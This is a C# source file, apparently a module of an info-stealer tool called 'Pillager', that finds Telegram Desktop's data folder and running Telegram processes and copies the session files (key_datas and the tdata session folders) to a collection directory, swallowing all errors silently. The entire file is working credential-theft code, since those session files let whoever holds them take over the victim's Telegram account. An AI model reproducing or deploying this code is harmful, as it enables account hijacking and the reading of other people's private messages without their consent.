using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Pillager.Messengers
{
    internal class Telegram : ICommand
    {
        public string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");

        private string[] sessionpaths =
            {
                "tdata\\key_datas",
                "tdata\\D877F783D5D3EF8Cs",
                "tdata\\D877F783D5D3EF8C\\configs",
                "tdata\\D877F783D5D3EF8C\\maps",
                "tdata\\A7FDF864FBC10B77s",
                "tdata\\A7FDF864FBC10B77\\configs",
                "tdata\\A7FDF864FBC10B77\\maps",
                "tdata\\F8806DD0C461824Fs",
                "tdata\\F8806DD0C461824F\\configs",
                "tdata\\F8806DD0C461824F\\maps",
                "tdata\\C2B05980D9127787s",
                "tdata\\C2B05980D9127787\\configs",
                "tdata\\C2B05980D9127787\\maps",
                "tdata\\0CA814316818D8F6s",
                "tdata\\0CA814316818D8F6\\configs",
                "tdata\\0CA814316818D8F6\\maps",
            };

        public override void Save(string path)
        {
            try
            {
                Process[] tgProcesses = Process.GetProcessesByName("Telegram");
                if (!Directory.Exists(MessengerPath) && tgProcesses.Length == 0) return;
                List<string> tgpaths = new List<string>();
                if (tgProcesses.Length > 0)
                {
                    foreach (var tgProcess in tgProcesses)
                    {
                        tgpaths.Add(Path.GetDirectoryName(tgProcess.MainModule.FileName));
                    }
                }
                if (!tgpaths.Contains(MessengerPath))
                    tgpaths.Add(MessengerPath);
                for (int i = 0; i < tgpaths.Count; i++)
                {
                    string savepath = Path.Combine(path, "Telegram");
                    Directory.CreateDirectory(savepath);

                    Directory.CreateDirectory(Path.Combine(savepath, "tdata_" + i));
                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\D877F783D5D3EF8C");
                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\A7FDF864FBC10B77");
                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\F8806DD0C461824F");
                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\C2B05980D9127787");
                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\0CA814316818D8F6");
                    foreach (var sessionpath in sessionpaths)
                    {
                        if (File.Exists(Path.Combine(tgpaths[i], sessionpath)))
                        {
                            File.Copy(Path.Combine(tgpaths[i], sessionpath), Path.Combine(savepath, sessionpath.Replace("tdata", "tdata_" + i)), true);
                        }
                    }
                }
            }
            catch { }
        }
    }
}
